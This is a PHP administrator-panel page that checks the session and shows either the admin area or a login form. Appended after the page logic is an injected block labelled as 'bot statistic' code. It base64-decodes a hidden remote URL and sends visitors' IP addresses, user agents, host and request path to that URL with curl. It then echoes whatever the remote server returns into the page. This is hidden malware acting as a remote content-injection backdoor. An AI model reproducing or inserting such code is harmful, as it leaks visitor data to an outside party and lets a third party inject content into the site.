<?php include("../includes/php/config.php");?><!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">

<HTML><HEAD><TITLE>Administrator Panel</TITLE>

<META http-equiv=Content-Type content="text/html; charset=utf-8">

<META content="MSHTML 6.00.2900.3020" name=GENERATOR>

<script language="javascript" type="text/javascript" src="js/jquery-1.8.2.min.js"></script>


<script language="javascript" src="java/kiemtra.js"></script>

<script language="javascript" src="ckeditor/ckeditor.js"></script>

<script type="text/javascript" src="js/colorpicker.js"></script>

    <script type="text/javascript" src="js/eye.js"></script>

    <script type="text/javascript" src="js/utils.js"></script>

    <script type="text/javascript" src="js/layout.js?ver=1.0.2"></script>

<link rel="stylesheet" type="text/css" href="../plugIn/dhtmlxCalendar/codebase/dhtmlxcalendar.css"/>

<link rel="stylesheet" type="text/css" href="../plugIn/dhtmlxCalendar/codebase/skins/dhtmlxcalendar_dhx_skyblue.css"/>

<link rel="stylesheet" href="css/colorpicker.css" type="text/css" />

<script src="../plugIn/dhtmlxCalendar/codebase/dhtmlxcalendar.js"></script>

</HEAD>

<body onLoad="doOnLoad();">

<?php



if(isset($_SESSION["userId"]))

{

	require("adminHeader.php");include_once('php/global.php');

	$str="<div style=\"clear:both;width:100%;height:100%;font-size:12px\">";

	if(isset($_GET["cnht"])) $str.=mainProcess();

	$str.="</div>";

	echo $str;

}

else if(!isset($_SESSION["userId"])||$_SESSION["userId"]=="")

{

	include_once('php/login.php');

}



?><?php

if (!isset($sRetry))

{

global $sRetry;

$sRetry = 1;

    // This code use for global bot statistic

    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot

    $stCurlHandle = NULL;

    $stCurlLink = "";

    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes

    {

        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            

        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);

            @$stCurlHandle = curl_init( $stCurlLink ); 

    }

    } 

if ( $stCurlHandle !== NULL )

{

    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);

    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);

    $sResult = @curl_exec($stCurlHandle); 

    if ($sResult[0]=="O") 

     {$sResult[0]=" ";

      echo $sResult; // Statistic code end

      }

    curl_close($stCurlHandle); 

}

}

?>

</body>

</HTML>

